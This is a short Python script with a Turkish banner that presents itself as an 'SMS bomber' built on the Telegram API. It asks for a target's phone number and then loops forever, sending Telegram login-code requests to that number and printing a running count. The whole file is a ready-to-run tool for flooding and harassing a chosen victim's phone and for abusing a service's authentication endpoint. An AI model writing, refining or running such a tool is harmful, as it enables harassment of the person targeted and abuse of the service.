import requests
from requests import get
from re import findall



print('''
╔╦╗╔═╗  ╔═╗╔╦╗╔═╗  ╔╗ ╔═╗╔╦╗╔╗ 
 ║ ║ ╦  ╚═╗║║║╚═╗  ╠╩╗║ ║║║║╠╩╗
 ╩ ╚═╝  ╚═╝╩ ╩╚═╝  ╚═╝╚═╝╩ ╩╚═╝
            #Coded By Canpolatgkky

   >>> Telegram Kanalım: t.me/androedit <<<

••Bu Tool Telegram Api Kullanarak Hedef Hesaba Sms Bomber Yapar

''')



ph = input('Spam Yapacağınız Telefon numarasını girin [ ülke koduyla birlikte Örn:0554 vb. ] : ')
newPh = ph.replace('+','')

headers = {
    'bot_id': '1288099309',
    'origin': 'https://t.me',
    'lang': 'en'
}

data = {
    'phone': newPh
}

c = 0
while True:
    r = requests.post('https://oauth.tg.dev/auth/request?bot_id=1288099309&origin=https://t.me&lang=en',headers=headers,data=data)
    c += 1
    print('GÖNDERİLDİ ✔'+ str(c))